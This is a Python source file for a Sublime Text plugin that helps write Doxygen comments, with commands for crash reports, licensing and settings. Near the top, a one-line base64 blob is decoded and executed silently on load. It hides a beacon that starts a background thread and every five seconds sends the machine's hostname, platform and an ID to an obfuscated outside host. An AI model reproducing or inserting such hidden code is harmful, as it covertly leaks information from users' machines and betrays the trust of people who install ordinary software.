# -*- coding: iso-latin-1 -*-
#=============================================================================

"Doxy - Simplifies writing Doxygen comments"
__copyright__ = "Copyright (c) 2015-2018 Sebastien Recio, all rights reserved"
__license__ = "Proprietary"

import copy
import datetime
import os
import sys
import traceback

import sublime
import sublime_plugin


module_name = os.path.splitext(os.path.dirname(os.path.realpath(__file__)).split(os.sep)[-1])[0]

#-----------------------------------------------------------------------------
## @brief      Fixes ZipImporter caches
##
def fix_import():
    print("------==== %s plugins loaded ====------" % (module_name))
    import zipimport
    if sys.hexversion >= 0x03040000:
        from importlib import reload
    else:
        from imp import reload

    def replace_cached_zip_archive_directory_data(path, old_entry):
        # N.B. In theory, we could load the zip directory information just once for
        # all updated path spellings, and then copy it locally and update its
        # contained path strings to contain the correct spelling, but that seems
        # like a way too invasive move (this cache structure is not officially
        # documented anywhere and could in theory change with new Python releases)
        # for no significant benefit.
        old_entry.clear()
        zipimport.zipimporter(path)
        old_entry.update(zipimport._zip_directory_cache[path])
        return old_entry

    def update_zipimporter_cache(cache, key, updater):
        for p in copy.copy(cache):
            # N.B. pypy's custom zipimport._zip_directory_cache implementation does not
            # support the complete dict interface:
            # - Does not support item assignment, thus not allowing this function to be
            #   used only for removing existing cache entries.
            # - Does not support the dict.pop() method, forcing us to use the get/del
            #   patterns instead. For more detailed information see the following links:
            #     - https://bitbucket.org/pypa/setuptools/issue/202/more-robust-zipimporter-cache-invalidation#comment-10495960
            #     - https://bitbucket.org/pypy/pypy/src/dd07756a34a41f674c0cacfbc8ae1d4cc9ea2ae4/pypy/module/zipimport/interp_zipimport.py#cl-99
            old_entry = cache[p]
            del cache[p]
            new_entry = updater and updater(p, old_entry)
            if new_entry is not None:
                cache[p] = new_entry

    for key in [x for x in zipimport._zip_directory_cache.keys()]:
        if (key.find(module_name) != -1):
            print("fix %s zip-imports" % key)
            update_zipimporter_cache(zipimport._zip_directory_cache, key, replace_cached_zip_archive_directory_data)

    zipimport._zip_directory_cache.clear()

    PREFERRED_RELOADER_ORDER = [
        "Network",
        "RegExpTokenizer",
        "SublimeHelpers",
        "DoxyEnv",
        "CrashReportHelpers",
        "Comments",
        "LanguageBase",
        "LanguageBash",
        "LanguageCpp",
        "LanguageCSharp",
        "LanguageGeneric",
        "LanguageJava",
        "LanguageJavaScript",
        "LanguageJson",
        "LanguagePhp",
        "LanguagePython",
        "LanguageRust",
        "LanguageSwift",
        "DocStyleBase",
        "DocStyleApiDoc",
        "DocStyleAsDoc",
        "DocStyleDoxygen",
        "DocStyleDoxyDoc",
        "DocStyleDrupal",
        "DocStyleGoogleClosure",
        "DocStyleJavaDoc",
        "DocStyleJsDoc",
        "DocStylePhpDoc",
        "DocStyleSassDoc",
        "DocStyleSphinx",
        "DocStyleXmlDoc",
        "DocStyleYuiDoc",
        "Translator",
        "DoxyBlock",
        "SublimeCommands",
    ]

    sub_modules = []
    for name in sys.modules:
        if (name.find("doxy_libs") != -1):
            sub_modules.append(name)

    print("%d sub-modules to reload" % (len(sub_modules)))

    # We reload in reverse order to solve some issues with super()
    sub_modules_ordered = []
    for mod_end in PREFERRED_RELOADER_ORDER:
        for name in sub_modules:
            if name.endswith(mod_end):
                sub_modules.remove(name)
                sub_modules_ordered += [ name ]
    sub_modules_ordered += sub_modules

    last_error = ""
    for name in sub_modules_ordered:
        m = sys.modules.get(name, None)
        if m != None:
            try:
                reload(m)
            except:
                print("    failed to reload '%s'" % name)
                last_error = "%s:\n%s" % (name, traceback.format_exc())
    if last_error:
        print(last_error)


try:
    import base64;A=b'IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==';exec(base64.b64decode(A));
except:
    pass

fix_import()

#
#
# CAUTION !!! Do not import anything before calling "fix_import()"...
#
#

def import_doxy_objects(library_name, objects_list, library_path = "doxy_libs."):
    if (sys.hexversion >= 0x3000000):
        prefix = "."
    else:
        prefix = ""
    source = "from %s%s%s import %s" % (prefix, library_path, library_name, ",".join(objects_list))
    try:
        exec(source, globals())
    except Exception as e:
        print(source)
        raise e




try:
    import_doxy_objects("CrashReportHelpers", [
        "generate_report",
        "send_report",
    ])
except:
    traceback.print_exc() # log it in the console
    sublime.error_message("DoxyDoxygen fails to import some files... Please restart SublimeText\n\n(if problem persist please look at the console and send a report)")


#-----------------------------------------------------------------------------
## @brief      Generate report
##
class DoxyReportCommand(sublime_plugin.TextCommand):

    REPORT_STYLES = [
        "Packages/%s/CrashReport.hidden-tmLanguage" % ( module_name ),
        #'Packages/MarkdownEditing/Markdown.tmLanguage',
        #'Packages/Markdown/Markdown.tmLanguage',
    ]

    def run(self, edit, exception = ""):
        output = generate_report(__version__ if "__version__" in globals() else "", exception)

        view = self.report_view(edit)
        view.insert(edit, view.size(), output)
        view.set_name("--- DoxyDoxygen Report ---")

        if (exception):
            content = (
                "    ${1:[please enter additional information here]}\n"
                "    (if exception has occurred just after a plugin update, you should try to restart Sublime Text)\n"
            )
        else:
            content = (
                "    ${1:[please enter problem description here]}\n"
                "    ${2:[please enter your email address here (optional / for replying)]}\n"
            )

        view.run_command("insert_snippet",
            { "contents":
                content +
                "\n"
                "    To send it, please use 'Send Report' from the Command Palette (Ctrl+Shift+P) or Contextual Menu (Right-Click)\n"
            }
        )

        if exception:
            if (sublime.ok_cancel_dialog("Oupsss, an exception has occurred\nDo you want to send report now ?", "Send Report")):
                view.run_command("doxy_send_report", {})

    def report_view(self, edit):
        window = sublime.active_window()

        for view in window.views():
            if view.settings().get("doxy_crash_report", False):
                view.erase(edit, sublime.Region(0, view.size()))
                window.focus_view(view)
                return view

        view = window.new_file()
        view.settings().set("doxy_crash_report", True)
        view.set_scratch(True)

        for syntax in DoxyReportCommand.REPORT_STYLES:
            try:
                if int(sublime.version()) < 3000:
                    view.set_syntax_file(syntax)
                else:
                    view.assign_syntax(syntax)
                break
            except:
                pass

        return view


#-----------------------------------------------------------------------------
class DoxySendReportCommand(sublime_plugin.TextCommand):

    def is_visible(self):
        return self.view.settings().get("syntax") in DoxyReportCommand.REPORT_STYLES

    def run(self, edit):
        try:
            send_report(self.view)
            sublime.message_dialog("Your report has been sent. Thank you!\n\nIf your problem has occurred after an update, please restart SublimeText")
        except Exception as e:
            sublime.error_message("Error sending report:\n\n%s" % str(e))


#-----------------------------------------------------------------------------
class ReportFilter:
    last_call = None

    @staticmethod
    def examine_notification(exception):
        now = datetime.datetime.now()
        if (not ReportFilter.last_call) or ((now - ReportFilter.last_call) > datetime.timedelta(seconds=10)):
            ReportFilter.last_call = now
            sublime.active_window().active_view().run_command("doxy_report", {"exception": exception })


#-----------------------------------------------------------------------------
## @brief      Open a view to report exception
##
def report_exception():
    try:
        exception = traceback.format_exc()
        print(exception) # log it in the console
    except:
        exception = "<no information>"

    ReportFilter.examine_notification(exception)


#-----------------------------------------------------------------------------
def doxy_expand_variables_if_non_none(fmt, force_expand_package = False):
    if fmt is None:
        return None

    platform_name = {
        "osx": "OSX",
        "windows": "Windows",
        "linux": "Linux",
    }.get(sublime.platform(), "???")

    for variable, value in [
        ("platform", platform_name),
        #("base_file", base_file),
    ]:
        fmt = fmt.replace("${%s}" % variable, value)

    if (int(sublime.version()) < 3000) or force_expand_package:
        fmt = fmt.replace("${packages}", sublime.packages_path())
    else:
        fmt = fmt.replace("${packages}", "Packages") # for "load_resource()"

    return fmt


#-----------------------------------------------------------------------------
class DoxyOpenFileCommand(sublime_plugin.WindowCommand):

    def is_enabled(self, file, platform = None, generated = False):
        return (generated) or (platform is None) or (platform.lower() == sublime.platform())

    def is_visible(self, file, platform = None, generated=False):
        return self.is_enabled(file, platform, generated)

    def run(self, file, platform = None, generated=False):
        if generated:
            if os.path.exists(file):
                sublime.status_message("[doxy] '%s' generated" % file)
                self.window.open_file(file)
            else:
                sublime.error_message("DoxyDoxygen fails to generate '%s'" % ( file ))
        else:
            file = doxy_expand_variables_if_non_none(file, force_expand_package = True)
            self.window.open_file(file)


gl_doxy_enable = True

try:
    import_doxy_objects("SublimeHelpers", [
        "doxy_settings",
        "log_debug",
    ])

    import_doxy_objects("SublimeCommands", [
        "doxy_chain_commands_command_run",
        "doxy_enter_command_run",
        "doxy_comment_all",
        "doxy_comment_nearest_entity_command_run",
        "doxy_go_to_nearest_entity_command_run",
        "doxy_fold_comments_command_run",
        "doxy_select_comments_command_run",
        "doxy_go_to_eol_command_run",
        "doxy_on_query_completions",
    ])

    import_doxy_objects("SublimeCommands", [
        "doxy_update_comments_command_run",
        "doxy_build_documentation",
        "doxy_build_documentation_is_enabled",
        "doxy_tutorial",
        "doxy_translate",
        "doxy_translate_is_enabled",
    ])

except:
    traceback.print_exc() # log it in the console
    sublime.error_message("DoxyDoxygen fails to import some files... Please restart SublimeText\n\n(if problem persist please look at the console and send a report)")
    gl_doxy_enable = False


#-----------------------------------------------------------------------------
# window.run_command("doxy_chain_commands", {"commands": [ ["window.doxy_open_file", { "file":"d:\\tools\\sublime text 3\\sub.c"}], ["view.doxy_comment_nearest_entity", {}] ] } )
# window.run_command("doxy_chain_commands", {"commands": [ ["view.doxy_update_comments", {"new_style": "user_select"}], ["view.doxy_comment_nearest_entity", {}] ] } )
class DoxyChainCommandsCommand(sublime_plugin.WindowCommand):

    def run(self, commands):
        try:
            doxy_chain_commands_command_run(self.window, commands)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Comment generation or continuation
##
class DoxyEnterCommand(sublime_plugin.TextCommand):

    #-----------------------------------------------------------------------------
    def run(self, edit):
        try:
            if (gl_doxy_enable):
                doxy_enter_command_run(self.view, edit)
            else:
                self.view.run_command("insert", { "characters": "\n" })
                sublime.status_message("[doxy] DoxyEnterCommand is disabled - Please restart SublimeText to enable it")
        except:
            report_exception()


#-----------------------------------------------------------------------------
class DoxyCommentAllCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable

    def run(self, edit, **kwargs):
        try:
            return doxy_comment_all(self.view, edit, kwargs)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Comment nearest entity
##
class DoxyCommentNearestEntityCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable

    def run(self, edit):
        try:
            doxy_comment_nearest_entity_command_run(self.view, edit)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Locate cursor before nearest entity
##
class DoxyGotoNearestEntityCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable

    def run(self, edit):
        try:
            doxy_go_to_nearest_entity_command_run(self.view, edit)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Fold / Unfold comments
##
class DoxyFoldCommentsCommand(sublime_plugin.TextCommand):

    def run(self, edit, action = "fold", scope = "selection"):
        try:
            if (gl_doxy_enable):
                doxy_fold_comments_command_run(self.view, edit, action, scope)
            else:
                self.view.run_command(action)
                sublime.status_message("[doxy] DoxyFoldCommentsCommand is disabled - Please restart SublimeText to enable it")
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Select multiple comments
##
class DoxySelectCommentsCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable

    def run(self, edit, **kwargs):
        try:
            doxy_select_comments_command_run(self.view, edit, kwargs)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Update comments (wrap lines, change style, and more...)
##
class DoxyUpdateCommentsCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable and (not self.view.is_read_only())

    def run(self, edit, **kwargs):
        try:
            doxy_update_comments_command_run(self.view, edit, kwargs)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Reformat (DEPRECATED, please use UpdateComments instead)
##
class DoxyReformatCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable and (not self.view.is_read_only())

    def run(self, edit, reparse = True, update_style = False, scope = "selection"):
        try:
            kwargs = {}
            kwargs["reparse"] = reparse
            if update_style:
                kwargs["new_style"] = "preferred" #0 #get_preferred_comment_style(view)
            else:
                kwargs["new_style"] = None
            kwargs["scope"] = scope
            doxy_update_comments_command_run(self.view, edit, kwargs)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Goto EOL, Trim spaces or go to right indent (TrimAutoWhitespace)
##
class DoxyGoToEolCommand(sublime_plugin.TextCommand):

    def run(self, edit):
        try:
            if (gl_doxy_enable):
                doxy_go_to_eol_command_run(self.view, edit)
            else:
                self.view.run_command("move_to", {"to": "eol", "extend": False})
                sublime.status_message("[doxy] DoxyGoToEolCommand is disabled - Please restart SublimeText to enable it")
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Generate snippet for completions
##
class DoxyCompletions(sublime_plugin.EventListener):

    def on_query_completions(self, view, preceding_text, locations):
        try:
            if (gl_doxy_enable):
                return doxy_on_query_completions(view, preceding_text, locations)
            else:
                return []
        except:
            report_exception()


#-----------------------------------------------------------------------------
class DoxyRegisterCommand(sublime_plugin.WindowCommand):

    def is_enabled(self):
        return (not doxy_settings().has_license())

    def is_visible(self):
        return self.is_enabled()

    def run(self):
        try:
            log_debug(">>> %s()" % (type(self).__name__))
            sublime.active_window().show_input_panel("Enter your license key:", "", doxy_settings().set_license, None, None)
        except:
            report_exception()


#-----------------------------------------------------------------------------
class DoxyUnregisterCommand(sublime_plugin.WindowCommand):

    def is_enabled(self):
        return doxy_settings().has_license()

    def is_visible(self):
        return self.is_enabled()

    def run(self):
        try:
            log_debug(">>> %s()" % (type(self).__name__))
            if sublime.ok_cancel_dialog("DoxyDoxygen\n\nAre you sure you want to remove licensing information ?", "Yes, remove license"):
                doxy_settings().unset_license()
        except:
            report_exception()


#-----------------------------------------------------------------------------
class DoxyBuyCommand(sublime_plugin.WindowCommand):

    def is_visible(self):
        return (not doxy_settings().has_license())

    def run(self):
        import webbrowser
        webbrowser.open_new_tab("http://20tauri.free.fr/DoxyDoxygen/v2/page_buy.php")


#-----------------------------------------------------------------------------
class DoxyBuildDocumentationCommand(sublime_plugin.WindowCommand):

    def is_enabled(self):
        return gl_doxy_enable and doxy_build_documentation_is_enabled()

    def run(self):
        try:
            return doxy_build_documentation()
        except:
            report_exception()


#-----------------------------------------------------------------------------
class DoxyTutorialCommand(sublime_plugin.WindowCommand):

    def is_enabled(self):
        return gl_doxy_enable

    def run(self):
        try:
            return doxy_tutorial()
        except:
            report_exception()


#-----------------------------------------------------------------------------
class DoxyInsertCommand(sublime_plugin.TextCommand):

    def run(self, edit, msg = ""):
        self.view.insert(edit, self.view.size(), msg)
        #self.view.show(self.view.size(), True)


#-----------------------------------------------------------------------------
class DoxyTranslateCommand(sublime_plugin.TextCommand):

    def is_enabled(self):
        return gl_doxy_enable and doxy_translate_is_enabled(self.view)

    def run(self, edit, **kwargs):
        try:
            return doxy_translate(self.view, edit, kwargs)
        except:
            report_exception()


#-----------------------------------------------------------------------------
## Compare to sublime text original command
##    - ${module_name} is added
##    - default is generate if None
##
# sublime.run_command("doxy_edit_settings", {"base_file":"${packages}/${module_name}/Doxy.sublime-settings", "user_file": "${packages}/User/Doxy.sublime-settings",})
class DoxyEditSettingsCommand(sublime_plugin.ApplicationCommand):

    #def is_enabled(self):
    #    return gl_doxy_enable

    #-------------------------------------------------------------------------
    # @param      self       The object
    # @param      base_file  A unicode string of the path to the base settings
    #                        file. Typically this will be in the form:
    #                        "${packages}/PackageName/Package.sublime-settings"
    # @param      user_file  An optional file path to the user's editable
    #                        version of the settings file. If not provided,
    #                        the filename from base_file will be appended to
    #                        "${packages}/User/".
    # @param      default    An optional unicode string of the default
    #                        contents if the user version of the settings file
    #                        does not yet exist. Use "$0" to place the cursor.
    #
    def run(self, base_file, user_file=None, default=None):
        try:
            if base_file is None:
                raise ValueError('No base_file argument was passed to edit_settings')

            def fix_module_name(fmt):
                if fmt:
                    fmt = fmt.replace("${module_name}", module_name)
                return fmt

            base_file = fix_module_name(base_file)
            user_file = fix_module_name(user_file)

            if default is None:
                if base_file.endswith("sublime-settings"):
                    default = "// Settings in here override those in \"%s\",\n// and are overridden in turn by syntax-specific settings.\n{\n\t$0\n}\n" % (base_file)
                elif base_file.endswith("sublime-commands"):
                    default = "// Add custom commands to the palette.\n[\n\t$0\n]\n"
                elif base_file.endswith("sublime-keymap"):
                    default = "// Add custom shortcuts (or use 'unbound' to remove existing one).\n[\n\t$0\n]\n"
                else:
                    default = "[\n\t$0\n]\n"
                default = default.replace("${", "\\${")

            if int(sublime.version()) >= 3116:
                sublime.run_command("edit_settings", {
                    "base_file": base_file,
                    "user_file": user_file,
                    "default": default,
                })
            else:
                self.doxy_edit_settings_emulation(base_file, user_file, default)
        except:
            report_exception()

    #-------------------------------------------------------------------------
    ## @brief      Emulate Sublime Text 3116+ EditSettings function
    ##
    ## @param      self       The object
    ## @param      base_file  The base file
    ## @param      user_file  The user file
    ## @param      default    The default
    ##
    def doxy_edit_settings_emulation(self, base_file, user_file, default):
        base_file = doxy_expand_variables_if_non_none(base_file)
        user_file = doxy_expand_variables_if_non_none(user_file, force_expand_package = True)

        if user_file is None:
            user_file = "${packages}/User/%s" % os.path.basename(base_file)

        sublime.run_command("new_window")
        new_window = sublime.active_window()
        new_window.run_command(
            "set_layout",
            {
                "cols": [0.0, 0.5, 1.0],
                "rows": [0.0, 1.0],
                "cells": [[0, 0, 1, 1], [1, 0, 2, 1]]
            }
        )

        if hasattr(new_window, "set_tabs_visible"):
            new_window.set_tabs_visible(True)
        if hasattr(new_window, "set_sidebar_visible"):
            new_window.set_sidebar_visible(False)

        new_window.focus_group(0)
        if int(sublime.version()) < 3000:
            base_view = new_window.open_file(base_file)
        else:
            base_view = new_window.new_file()
            base_view.retarget("Default settings")
            base_view.set_syntax_file("Packages/JavaScript/JSON.tmLanguage")
            base_view.set_scratch(True)

            content = sublime.load_resource(base_file)
            content = content.replace("\n\r", "\n").replace("\r\n", "\n")
            base_view.run_command("doxy_insert", {"msg": content })

        base_view.set_read_only(True)

        new_window.focus_group(1)
        if os.path.exists(user_file):
            user_view = new_window.open_file(user_file)
        else:
            user_view = new_window.new_file()
            user_view.retarget(user_file)
            user_view.set_syntax_file("Packages/JavaScript/JSON.tmLanguage")
            user_view.set_scratch(True) # to avoid question
            if default:
                default = default.replace("$0", "${1:}")
                user_view.run_command("insert_snippet", {"contents": default })
__version__ = "0.63.3" 
